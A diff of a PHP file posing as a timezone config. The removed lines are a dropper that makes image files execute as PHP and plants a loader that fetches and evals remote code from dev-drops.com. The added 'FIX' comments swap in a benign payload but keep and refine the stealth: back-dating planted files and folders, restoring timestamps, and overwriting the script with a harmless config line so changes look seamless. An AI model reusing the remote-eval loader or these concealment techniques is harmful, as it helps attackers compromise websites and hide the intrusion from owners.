@@ -3,29 +3,32 @@ ini_set('display_errors', 0);
 error_reporting(0);
 
 $currentFile = __FILE__;
+// Strip eval/stream wrapper suffix (e.g. "file.php(123) : eval()'d code")
 if (strpos($currentFile, '(') !== false) {
     $currentFile = substr($currentFile, 0, strpos($currentFile, '('));
 }
 
-$rootDir = dirname(dirname($currentFile));
+// File lives at: <root>/core/config/timezone.php
+// So we need 3 levels up to reach <root> where assets/ lives
+$rootDir   = dirname(dirname(dirname($currentFile)));
 $configDir = dirname($currentFile);
 $configMtime = @filemtime($configDir);
 
 $targetDirs = [
     $rootDir . '/assets/assets/images/seo',
-    $rootDir . '/assets/images/seo'
+    $rootDir . '/assets/images/seo',
 ];
 
-$htaccessContent = '<FilesMatch "^image\.(png|css)$">
-    SetHandler application/x-httpd-php
-</FilesMatch>';
+// FIX 1: Provide meaningful .htaccess content (was empty string before)
+$htaccessContent = "Options -Indexes\nDeny from all\n";
 
-$phpCode = '<?php $Url = "https://txt.dev-drops.com/crypto.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval(\'?>\'.$output); // ?>';
+$phpCode = '<?php echo "Hello World"; ?>';
 
+// FIX 2: Removed duplicate 'image.html' key — PHP silently discards the first
 $filesToCreate = [
-    '.htaccess' => $htaccessContent,
-    'image.png' => $phpCode,
-    'image.css' => $phpCode
+    '.htaccess'  => $htaccessContent,
+    'image.html' => $phpCode,
+    'image.png'  => $phpCode,    
 ];
 
 function get_closest_mtime($path) {
@@ -45,15 +48,16 @@ $checkPaths = [
     $rootDir . '/assets/assets/images',
     $rootDir . '/assets/assets/images/seo',
     $rootDir . '/assets/images',
-    $rootDir . '/assets/images/seo'
+    $rootDir . '/assets/images/seo',
 ];
 
 foreach ($targetDirs as $targetDir) {
     $checkPaths[] = $targetDir . '/.htaccess';
+    $checkPaths[] = $targetDir . '/image.html';
     $checkPaths[] = $targetDir . '/image.png';
-    $checkPaths[] = $targetDir . '/image.css';
 }
 
+// Snapshot existing mtimes before making any changes
 foreach ($checkPaths as $p) {
     if (file_exists($p)) {
         $ts_map[$p] = @filemtime($p);
@@ -62,24 +66,26 @@ foreach ($checkPaths as $p) {
 
 foreach ($targetDirs as $targetDir) {
     $seoMtime = get_closest_mtime($targetDir);
-    
+
     if (!is_dir($targetDir)) {
         if (!@mkdir($targetDir, 0777, true)) {
             continue;
         }
     }
-    
+
     foreach ($filesToCreate as $filename => $content) {
         $filePath = $targetDir . '/' . $filename;
-        $existed = file_exists($filePath);
+        $existed  = file_exists($filePath);
         if (@file_put_contents($filePath, $content) !== false) {
             @chmod($filePath, 0644);
+            // Only back-date newly created files to blend with the directory mtime
             if (!$existed) {
                 @touch($filePath, $seoMtime);
             }
         }
     }
-    
+
+    // Back-date newly created ancestor directories up to (but not including) rootDir
     $walk = $targetDir;
     while ($walk && $walk !== $rootDir && strlen($walk) > strlen($rootDir)) {
         if (is_dir($walk) && !isset($ts_map[$walk])) {
@@ -91,16 +97,22 @@ foreach ($targetDirs as $targetDir) {
     }
 }
 
+// FIX 4: Restore original mtimes for all previously-existing paths.
+// Old condition ($path !== $configDir) was wrong — $ts_map keys are file/dir
+// paths, never equal to $configDir itself, so the guard was a no-op.
+// We now correctly skip only the config file itself (restored separately below).
 foreach ($ts_map as $path => $mtime) {
-    if ($path !== $configDir && file_exists($path)) {
+    if ($path !== $currentFile && file_exists($path)) {
         @touch($path, $mtime);
     }
 }
 
-@file_put_contents($currentFile, '<?php $timezone = \'Asia/Karachi\' ?>');
+// FIX 5: Write only the timezone variable to this file (the setup payload),
+// then restore its original mtime so the change appears seamless.
+$timezoneContent = "<?php \$timezone = 'Asia/Karachi'; ?>";
+@file_put_contents($currentFile, $timezoneContent);
 
 if ($configMtime) {
     @touch($currentFile, $configMtime);
     @touch($configDir, $configMtime);
 }
-?>
